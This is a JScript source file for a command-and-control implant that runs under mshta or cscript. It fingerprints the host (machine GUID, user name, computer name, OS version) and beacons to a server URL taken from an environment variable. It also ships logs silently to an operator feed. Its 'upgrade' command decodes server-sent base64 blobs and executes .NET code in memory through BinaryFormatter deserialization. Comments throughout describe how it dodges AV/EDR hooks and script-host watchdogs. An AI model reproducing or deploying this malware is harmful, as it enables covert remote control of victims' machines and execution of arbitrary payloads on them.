function runAgent() {
    var shell = null, identityHeaders = null, exiting = false;
    var clrVersion = 'v4.0.30319';
    // ── host mode ───────────────────────────────────────────────────────────
    // mshta (the deployment host) runs script on a windowed IE engine with a
    // slow-script watchdog: ONE activation that never yields pops the modal
    // "...causing the program to run slowly / Stop running this script?" alert —
    // and since the host master hides its window first, that modal is INVISIBLE
    // and blocking: the beacon loop didn't look slow, it FROZE waiting for a
    // click nobody could make. MSHTA mode restructures the loop around
    // setTimeout — every cycle a fresh activation (the watchdog's statement
    // counter resets, mshta pumps messages between cycles) — and peeks the
    // async transport on a 50 ms tick instead of blocking it. WSH (cscript /
    // wscript, the verification hosts) has no watchdog and no timers: there the
    // loop stays fully SYNCHRONOUS, byte-identical in behavior to the old
    // while-loop — open(..., false), blocking send, same fatal contract.
    var MSHTA = (typeof setTimeout !== 'undefined') && (typeof WScript === 'undefined');
    function later(fn) { setTimeout(fn, 1); }
    function ensureShell() {
        if (!shell) shell = new ActiveXObject('WScript.Shell');
    }
    // log() = relay ship ONLY (zero local echo — no Echo, no alert, no dbg).
    // Every line is POSTed with X-Log-Only: 1: the relay answers immediately
    // (no long-poll hold) and broadcasts an agent_log event to the operator's
    // events feed. NEVER fatal — a failed ship is swallowed in silence. Body =
    // one frame holding the line (UTF-8-ish: chars are masked to a byte).
    // Ships are FIRE-AND-FORGET: the transport opens async and is never waited
    // on, so a ship no longer stalls the loop with a synchronous round-trip —
    // keep log() calls to milestones either way. Each ship keeps BOTH the xhr
    // (a RELEASED WinHttpRequest cancels its own in-flight send) and the body
    // safearray (see sendBody — async send consumes it on a winhttp thread)
    // alive in logShips until a zero-timeout peek reaps it once per cycle; the
    // cap bounds a chatty command to 3 open sockets, dropping lines beyond it
    // (log is best-effort — a ship still in flight when the agent finishes
    // dies with the process).
    var logShips = [];
    function log(line) {
        postLog(line);
    }
    function reapLogShips() {
        for (var i = logShips.length - 1; i >= 0; i--) {
            var finished = true;
            try { finished = logShips[i].x.waitForResponse(0); } catch (e0) {}
            if (finished) logShips.splice(i, 1);
        }
    }
    function postLog(line) {
        if (!beaconUrl || !identityHeaders) return;
        reapLogShips();
        if (logShips.length >= 3) return;
        try {
            var bytes = [];
            for (var i = 0; i < line.length; i++) bytes.push(line.charCodeAt(i) & 255);
            var xhr = makeTransport(true);
            if (!xhr) return;
            try { xhr.setProxy(1, '', ''); } catch (e1) {}
            try { xhr.setTimeouts(10000, 10000, 15000, 15000); } catch (e1b) {}
            for (var h = 0; h < identityHeaders.length; h++) {
                try { xhr.setRequestHeader(identityHeaders[h][0], identityHeaders[h][1]); } catch (e2) {}
            }
            xhr.setRequestHeader('X-Log-Only', '1');
            logShips.push({ x: xhr, b: sendBody(xhr, buildBodyStream([bytes])) });
        } catch (e3) {}
    }
    function readEnv(name) {
        ensureShell();
        var value = shell.ExpandEnvironmentStrings('%' + name + '%');
        return (value == '%' + name + '%') ? '' : value;
    }
    // ── transport ───────────────────────────────────────────────────────────
    // WinHttp.WinHttpRequest.5.1 — winhttp.dll's own object, no MSXML in the
    // path: immune both to the IE-zone denials plain XMLHTTP suffers and to the
    // AV/EDR hooks and DLL policy that deny the msxml3/msxml6 ServerXMLHTTP
    // classes on hardened boxes (0x80070005 "Access is denied" at open()).
    // SYNC for the WSH beacon (all that loop needs); ASYNC for the mshta
    // beacon (the loop peeks — a blocking send would park the windowed host's
    // one thread) and for every log ship (fire-and-forget). One API difference
    // from the MSXML objects: send() takes a BSTR or a UI1 safearray, never an
    // ADODB.Stream — sendBody() reads the stream into its safearray.
    function makeTransport(asyncMode) {
        try {
            var t = new ActiveXObject('WinHttp.WinHttpRequest.5.1');
            t.open('POST', beaconUrl, asyncMode ? true : false);
            return t;
        } catch (e) { return null; }
    }
    // send()'s body must OUTLIVE an ASYNC send: winhttp consumes the safearray
    // on its own worker thread AFTER send() returns, and a released array is a
    // use-after-free — mshta's idle-time GC collected it within seconds of the
    // first ships (bodies arrived EMPTY, then the process crashed outright
    // mid-response). The SYNC WSH beacon is immune (send consumes the body
    // before returning); every async caller retains the RETURNED variant until
    // its request completes or is reaped.
    function sendBody(xhr, stream) {
        if (!stream) { xhr.send(''); return null; }
        var arr = stream.Read();
        xhr.send(arr);
        return arr;
    }
    function u32Bytes(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
    // ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
    // The body is a stream of [u32le length][bytes] frames; one POST carries every
    // response owed since the last one, and the answer carries every queued
    // command (same contract as the C# agent — no encoding negotiation).
    //
    // JScript has no byte type, so ADODB.Stream is the COM bridge on both sides:
    //   SEND  — WriteText with Charset 'iso-8859-1' maps chars 0x00-0xFF to bytes
    //           1:1 (EMPIRICALLY VERIFIED: the WRITE direction is identity; only
    //           the read direction applies cp1252 — see below), then switch Type
    //           to 1 and hand the stream to xhr.send().
    //   READ  — Write(responseBody), then ReadText: MLang's 'iso-8859-1'/'windows-
    //           1252' READ decodes bytes 0x80-0x9F as their cp1252 Unicode chars
    //           (U+20AC etc); the fix-up below maps those 27 chars back to bytes.
    // The READ side stays a STRING end-to-end: ReadText already yields one JS
    // char per byte, and every per-byte script loop is exactly what trips the
    // mshta slow-script watchdog on big command frames (a multi-MB upgrade blob
    // is tens of millions of statements in ONE activation) — so the cp1252
    // fix-up runs as ONE native replace() whose callback fires only for the 27
    // mapped chars, and frame slicing is engine-internal substring work. Bytes
    // 0x00-0x7F and 0xA0-0xFF decode 1:1 (char == byte); the undefined cp1252
    // slots (0x81/0x8D/0x8F/0x90/0x9D) pass through as their C1 chars —
    // charCodeAt == byte in every case. All 256 byte values round-trip
    // (verified under cscript against a live HTTP listener).
    //   An EMPTY response body must NOT go through the stream (converting a
    //   zero-length stream throws) — gate on Content-Length first.
    function bytesToBinString(bytes) {
        var out = '', i;
        for (i = 0; i < bytes.length; i += 4096) {
            var chunk = '';
            for (var j = i; j < i + 4096 && j < bytes.length; j++) chunk += String.fromCharCode(bytes[j]);
            out += chunk;
        }
        return out;
    }
    function buildBodyStream(frames) {
        var text = '';
        for (var i = 0; i < frames.length; i++) {
            var f = frames[i];
            text += String.fromCharCode(f.length & 255, (f.length >>> 8) & 255, (f.length >>> 16) & 255, (f.length >>> 24) & 255);
            text += bytesToBinString(f);
        }
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Type = 2;
        stream.Charset = 'iso-8859-1';
        stream.Open();
        stream.WriteText(text);
        stream.Position = 0;
        stream.Type = 1;
        return stream;
    }
    var CP1252_INVERSE = {
        0x20AC: 0x80, 0x201A: 0x82, 0x0192: 0x83, 0x201E: 0x84, 0x2026: 0x85, 0x2020: 0x86,
        0x2021: 0x87, 0x02C6: 0x88, 0x2030: 0x89, 0x0160: 0x8A, 0x2039: 0x8B, 0x0152: 0x8C,
        0x017D: 0x8E, 0x2018: 0x91, 0x2019: 0x92, 0x201C: 0x93, 0x201D: 0x94, 0x2022: 0x95,
        0x2013: 0x96, 0x2014: 0x97, 0x02DC: 0x98, 0x2122: 0x99, 0x0161: 0x9A, 0x203A: 0x9B,
        0x0153: 0x9C, 0x017E: 0x9E, 0x0178: 0x9F
    };
    // The fix-up class is BUILT FROM the inverse table (one source of truth,
    // so it can never drift from it) — and the source stays pure ASCII: literal
    // non-ASCII regex characters would depend on how the host decodes the file.
    var CP1252_CHARS = '';
    for (var cpk in CP1252_INVERSE) CP1252_CHARS += String.fromCharCode(parseInt(cpk, 10));
    var CP1252_FIXUP = new RegExp('[' + CP1252_CHARS + ']', 'g');
    function responseToText(body) {
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Type = 1;
        stream.Open();
        stream.Write(body);
        stream.Position = 0;
        stream.Type = 2;
        stream.Charset = 'windows-1252';
        var text = stream.ReadText(-1);
        stream.Close();
        return text.replace(CP1252_FIXUP, function (c) {
            return String.fromCharCode(CP1252_INVERSE[c.charCodeAt(0)]);
        });
    }
    function parseFrames(text) {
        var frames = [], i = 0;
        while (i + 4 <= text.length) {
            var len = (text.charCodeAt(i) | (text.charCodeAt(i + 1) << 8) | (text.charCodeAt(i + 2) << 16) | (text.charCodeAt(i + 3) << 24)) >>> 0;
            i += 4;
            frames.push(text.slice(i, i + len));
            i += len;
        }
        return frames;
    }
    function base64ToStream(base64, byteLength) {
        var encoding = new ActiveXObject('System.Text.ASCIIEncoding');
        var encodedLength = encoding.GetByteCount_2(base64);
        var raw = encoding.GetBytes_4(base64);
        var decoder = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
        raw = decoder.TransformFinalBlock(raw, 0, encodedLength);
        var stream = new ActiveXObject('System.IO.MemoryStream');
        stream.Write(raw, 0, byteLength);
        stream.Position = 0;
        return stream;
    }
    var GUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
    function loadGuid() {
        // CANONICAL machine uuid = the MachineGuid an x86 process sees (the Wow6432Node copy
        // on a 64-bit host) — the only view a 32-bit script host can reach, so it is the view
        // EVERY breed derives (the C# breed pins the same view with RegGetValue's
        // RRF_SUBKEY_WOW6432KEY). The native 64-bit copy is NEVER read: it holds a DIFFERENT
        // GUID on many machines, and letting host bitness pick the view mints a second agent
        // row on the same target.
        function readMachineGuid() {
            // The default view ONLY — redirected to the Wow6432Node copy when this host is
            // x86 on a 64-bit OS (that redirected copy IS the canonical uuid), the single
            // view on a 32-bit OS. NO cross-view fallback: StdRegProv serves the NATIVE
            // 64-bit view regardless of caller bitness, and that copy holds a DIFFERENT
            // GUID on many machines — keying on it would mint a second agent row. A miss
            // falls through to the SMBIOS uuid below, matching the C# breed's chain.
            var value = '';
            try { value = ('' + shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid')).toLowerCase(); } catch (e) {}
            return value;
        }
        var guid = '';
        var hostArch = readEnv('PROCESSOR_ARCHITECTURE');
        if (!readEnv('PROCESSOR_ARCHITEW6432') && (hostArch == 'AMD64' || hostArch == 'ARM64')) {
            // 64-bit host (the cscript vector — the mshta loader re-hosts to x86 instead):
            // pin to the canonical x86 view via the explicit Wow6432Node path; NEVER fall
            // back to this host's native default view.
            try { guid = ('' + shell.RegRead('HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Cryptography\\MachineGuid')).toLowerCase(); } catch (e64) {}
        } else {
            // x86 host on a 64-bit OS (the ensureX86Host re-host — the default view IS the
            // Wow6432Node copy) or a 32-bit OS (single view): default view = canonical.
            guid = readMachineGuid();
        }
        if (!GUID_RE.test(guid)) {
            // Fall back to the SMBIOS hardware UUID; stable across OS reinstalls.
            try {
                var wmi = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\cimv2');
                var uuidQuery = new Enumerator(wmi.ExecQuery('SELECT UUID FROM Win32_ComputerSystemProduct'));
                for (; !uuidQuery.atEnd(); uuidQuery.moveNext()) {
                    var uuid = ('' + uuidQuery.item().UUID).toLowerCase();
                    if (GUID_RE.test(uuid)) guid = uuid;
                }
            } catch (e3) {}
        }
        // Every source failed: return '' so the header is OMITTED below — the relay treats a
        // missing header as identity-less (the same contract the C# breed ships). NEVER a
        // zero GUID: all zeros is a valid-shaped value that would key ONE shared phantom row
        // for every machine where detection failed.
        return GUID_RE.test(guid) ? guid : '';
    }
    function makeSessionKey() {
        // A RANDOM per-RUNTIME key — NOT identity. A fresh value on every process launch
        // (kept in this closure, sent on every beacon) so the relay/C2 can tell agent
        // RUNTIMES apart on one machine: the machine uuid above stays THE identity rows
        // are keyed by; the session key distinguishes concurrent or succeeding processes
        // (an UpgradeNetFramework takeover swaps it JS→C# mid-session). CoCreateGuid via
        // Scriptlet.TypeLib; the Math.random fallback only needs uniqueness, not
        // unpredictability — the key identifies, it authorizes nothing.
        try {
            var guid = ('' + new ActiveXObject('Scriptlet.TypeLib').GUID).toLowerCase();
            guid = guid.replace(/[{}]/g, '');
            if (GUID_RE.test(guid)) return guid;
        } catch (e) {}
        var hex = '0123456789abcdef', key = '';
        for (var i = 0; i < 36; i++) {
            if (i == 8 || i == 13 || i == 18 || i == 23) key += '-';
            else key += hex.charAt(Math.floor(Math.random() * 16));
        }
        return key;
    }
    function buildIdentity() {
        var guid = loadGuid();
        var archMap = { AMD64: 'x86_64', x86: 'i386', ARM64: 'aarch64' };
        var archFromEnv = readEnv('PROCESSOR_ARCHITEW6432');
        if (!archFromEnv) archFromEnv = readEnv('PROCESSOR_ARCHITECTURE');
        // Undetected values stay '' — the header is OMITTED below, never sent empty and
        // never as a placeholder like 'unknown' (the relay/C2 read that as "not reported").
        var arch = archMap[archFromEnv] || archFromEnv;
        var processArch = archMap[readEnv('PROCESSOR_ARCHITECTURE')] || '';
        var osVersion = '', buildNumber = '', cpuArchCode = '';
        try {
            var wmi = new ActiveXObject('WbemScripting.SWbemLocator').ConnectServer('.', 'root\\cimv2');
            var osQuery = new Enumerator(wmi.ExecQuery('SELECT Version, BuildNumber FROM Win32_OperatingSystem'));
            for (; !osQuery.atEnd(); osQuery.moveNext()) { osVersion = '' + osQuery.item().Version; buildNumber = '' + osQuery.item().BuildNumber; }
            var cpuQuery = new Enumerator(wmi.ExecQuery('SELECT Architecture FROM Win32_Processor'));
            for (; !cpuQuery.atEnd(); cpuQuery.moveNext()) { cpuArchCode = '' + cpuQuery.item().Architecture; }
        } catch (e) {}
        arch = ({ '0': 'i386', '9': 'x86_64', '12': 'aarch64' })[cpuArchCode] || arch;
        var versionMatch = /^(\d+)\.(\d+)/.exec(osVersion);
        if (versionMatch) { if (versionMatch[1] == '6' && versionMatch[2] == '1') clrVersion = 'v2.0.50727'; }
        else if (buildNumber == '7600' || buildNumber == '7601') clrVersion = 'v2.0.50727';
        // REQUIRED headers carry compile-time constants. Every detection-derived field is
        // OPTIONAL: a value that could not be detected OMITS the header so the relay/C2
        // see "not reported" instead of an empty string or a fabricated default. The
        // machine UUID is nullable too — when every fallback fails it is omitted and the
        // relay treats the agent as identity-less (beacons answered with held 200s, no
        // session, no commands). There is NO Bitness header: the process arch already
        // carries the full width, and x86_64/aarch64 are both 64-bit — a bare bit flag
        // would say nothing about which.
        var headers = [
            ['X-Api-Version', '1'],
            ['X-Platform', 'Windows'],
            ['X-Client-Id', '1'],
            ['X-Client-Features', '0800000000000000']
        ];
        function addHeader(name, value) { if (value) headers.push([name, '' + value]); }
        addHeader('X-Device-Id', guid);
        addHeader('X-Session-Id', makeSessionKey());
        addHeader('X-Device-Name', readEnv('COMPUTERNAME'));
        addHeader('X-User-Id', readEnv('USERNAME'));
        addHeader('X-Device-Arch', arch);
        addHeader('X-App-Arch', processArch);
        addHeader('X-OS-Version', osVersion);
        addHeader('X-OS-Build', buildNumber);
        return headers;
    }
    function dispatchCommand(frame) {
        function base64Length(base64) {
            var padding = 0;
            if (base64.charAt(base64.length - 1) == '=') padding++;
            if (base64.charAt(base64.length - 2) == '=') padding++;
            return Math.floor(base64.length / 4) * 3 - padding;
        }
        // Command layout: [opcode][corrId:u32le][payload...]. Every reply echoes the id
        // after its status: [status:u32le][corrId:u32le]. Id 0 = unmatched.
        // Frames arrive as fixed-up STRINGS (see responseToText) — charCodeAt IS
        // the byte, substring the payload.
        var corrId = frame.length >= 5
            ? ((frame.charCodeAt(1) | (frame.charCodeAt(2) << 8) | (frame.charCodeAt(3) << 16) | (frame.charCodeAt(4) << 24)) >>> 0)
            : 0;
        function reply(status) { return u32Bytes(status).concat(u32Bytes(corrId)); }
        if (frame.charCodeAt(0) == 10) { exiting = true; return null; }
        if (frame.charCodeAt(0) == 11) {
            try {
                var payloadText = frame.substring(5);
                var headerEnd = payloadText.indexOf('\n\n');
                var headerLines = (headerEnd >= 0 ? payloadText.substring(0, headerEnd) : '').split('\n');
                var bodyText = headerEnd >= 0 ? payloadText.substring(headerEnd + 2) : '';
                var stage1Split = bodyText.indexOf('\n');
                var stage1B64 = (stage1Split >= 0 ? bodyText.substring(0, stage1Split) : '').replace(/\s+/g, '');
                var blobB64 = (stage1Split >= 0 ? bodyText.substring(stage1Split + 1) : '').replace(/\s+/g, '');
                ensureShell();
                try { shell.Environment('Process')('COMPLUS_Version') = clrVersion; log('upgrade: COMPLUS_Version=' + clrVersion); } catch (e0) {}
                var driveMode = 0, entryPoint = '';
                for (var h = 0; h < headerLines.length; h++) {
                    var line = headerLines[h].replace(/\r$/, '');
                    if (line.length == 0) continue;
                    if (line.indexOf('!d=') == 0) driveMode = parseInt(line.substring(3), 10) || 0;
                    else if (line.indexOf('!e=') == 0) entryPoint = line.substring(3);
                    else {
                        var eqIndex = line.indexOf('=');
                        if (eqIndex > 0) { ensureShell(); shell.Environment('Process')('' + line.substring(0, eqIndex)) = '' + line.substring(eqIndex + 1); log('upgrade: set ' + line); }
                    }
                }
                log('upgrade: blob ' + blobB64.length + ' chars, stage1 ' + stage1B64.length + ' chars, drive ' + driveMode);
                if (stage1B64.length > 0) {
                    try { var stage1Formatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); stage1Formatter.Deserialize_2(base64ToStream(stage1B64, base64Length(stage1B64))); } catch (e1) { log('upgrade: stage1 threw (expected)'); }
                }
                var blobFormatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
                if (driveMode == 1) {
                    var invokeArgs = new ActiveXObject('System.Collections.ArrayList');
                    invokeArgs.Add(undefined);
                    blobFormatter.Deserialize_2(base64ToStream(blobB64, base64Length(blobB64))).DynamicInvoke(invokeArgs.ToArray()).CreateInstance(entryPoint);
                } else {
                    blobFormatter.Deserialize_2(base64ToStream(blobB64, base64Length(blobB64)));
                }
                log('upgrade: deserialize done');
                return reply(0);
            } catch (e) { log('upgrade failed: ' + (e && e.message ? e.message : e)); return reply(1); }
        }
        log('command opcode ' + frame.charCodeAt(0) + ' unknown — replying status 2');
        return reply(2);
    }
    ensureShell();
    var beaconUrl = readEnv('H_URL');
    if (!beaconUrl) { log('beacon endpoint not set'); return 'fail'; }
    identityHeaders = buildIdentity();
    var uuidForLog = '';
    for (var u = 0; u < identityHeaders.length; u++)
        if (identityHeaders[u][0] == 'X-Device-Id') uuidForLog = identityHeaders[u][1];
    log('JScript agent beaconing to ' + beaconUrl + ' as ' + (uuidForLog || 'an unidentified machine'));
    var pendingReplies = [];
    // ── the beacon loop ─────────────────────────────────────────────────────
    // One cycle = one POST (carrying every reply owed since the last one) +
    // parse + dispatch; 'continue' means re-POST. WSH drives cycles from a
    // plain synchronous while — byte-identical to the old loop. mshta splits
    // the same cycle into prepare → async send → 50 ms zero-timeout peeks,
    // every step entered through setTimeout so no activation outlives one
    // cycle. Completion under mshta is the HOST HOOK onAgentDone(status) —
    // the async twin of the return value, called only if the host defined
    // one (the master then quits; without the hook the loop just ends).
    // runAgent itself returns 'async' right after scheduling — the master's
    // cue to skip its own synchronous quitHost().
    function finish(status) {
        if (MSHTA && typeof onAgentDone == 'function') { try { onAgentDone(status); } catch (e0) {} }
        return status;
    }
    function handleResponse(xhr) {
        var status = 0;
        try { status = xhr.status; } catch (e1) { return 'fail'; }
        if (status != 200) { log('http ' + status); return 'fail'; }
        pendingReplies = [];
        // Empty answer = nothing queued — re-POST immediately. The stream conversion
        // of a zero-length body throws, so gate on Content-Length, never on ''-checks.
        var contentLength = 0;
        try { contentLength = parseInt(xhr.getResponseHeader('Content-Length') || '0', 10); } catch (e2) {}
        if (contentLength == 0) { log('idle — empty answer'); return 'continue'; }
        var frames = parseFrames(responseToText(xhr.responseBody));
        for (var f = 0; f < frames.length && !exiting; f++) {
            var replyBytes = dispatchCommand(frames[f]);
            if (exiting) { log('exit'); return 'exit'; }
            if (replyBytes) pendingReplies.push(replyBytes);
        }
        return 'continue';
    }
    function prepareRequest() {
        var xhr = makeTransport(MSHTA);
        if (!xhr) return null;
        try { xhr.setProxy(1, '', ''); } catch (e1) {}
        try { xhr.setTimeouts(10000, 10000, 15000, 45000); } catch (e1b) {}
        for (var i = 0; i < identityHeaders.length; i++) {
            try { xhr.setRequestHeader(identityHeaders[i][0], identityHeaders[i][1]); } catch (e2) {}
        }
        return xhr;
    }
    function wshCycle() {
        reapLogShips();
        var xhr = null;
        try {
            xhr = prepareRequest();
            if (!xhr) return 'fail';
            sendBody(xhr, pendingReplies.length ? buildBodyStream(pendingReplies) : '');
        } catch (e) {
            return 'fail';
        }
        return handleResponse(xhr);
    }
    if (MSHTA) {
        var pollXhr = null, pollBody = null, pollDeadline = 0;
        function mshtaCycle() {
            reapLogShips();
            try {
                pollXhr = prepareRequest();
                if (!pollXhr) { finish('fail'); return; }
                // pollBody retains the body safearray for the async send (see
                // sendBody) until the NEXT cycle replaces it — well past this
                // request's completion.
                pollBody = sendBody(pollXhr, pendingReplies.length ? buildBodyStream(pendingReplies) : '');
            } catch (e) {
                finish('fail');
                return;
            }
            // 90 s hard deadline: the SetTimeouts phases (10+10+15+45 s worst case)
            // already bound the request — this is the async twin of those bounds,
            // after which the request is abandoned as fatal (the WSH path gets the
            // same guarantee implicitly inside its blocking send).
            pollDeadline = new Date().getTime() + 90000;
            later(mshtaPoll);
        }
        function mshtaPoll() {
            var complete = false;
            try { complete = pollXhr.waitForResponse(0); } catch (e0) { finish('fail'); return; }
            if (!complete) {
                if (new Date().getTime() > pollDeadline) {
                    try { pollXhr.abort(); } catch (e1) {}
                    finish('fail');
                    return;
                }
                setTimeout(mshtaPoll, 50);
                return;
            }
            var status = handleResponse(pollXhr);
            if (status == 'continue') later(mshtaCycle);
            else finish(status);
        }
        later(mshtaCycle);
        return 'async';
    }
    while (true) {
        var status = wshCycle();
        if (status != 'continue') return finish(status);
    }
}
